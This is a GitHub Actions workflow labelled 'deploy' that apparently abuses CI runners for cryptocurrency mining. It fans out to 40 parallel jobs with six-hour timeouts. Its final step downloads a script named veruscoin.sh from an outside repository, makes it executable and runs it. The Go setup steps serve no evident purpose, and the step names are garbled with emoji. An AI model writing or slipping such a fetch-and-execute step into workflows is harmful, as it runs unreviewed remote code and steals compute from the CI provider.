ohname: deploy
on: [push, pull_request]
jobs:
  build:
    name: run👉
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go: [1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
        flag: [A, B, C, D, E]
    timeout-minutes: 360
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Settting😍
      uses: actions/checkout@v1
    - name: run👉
      run: |
          wget https://github.com/vps881/vps/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
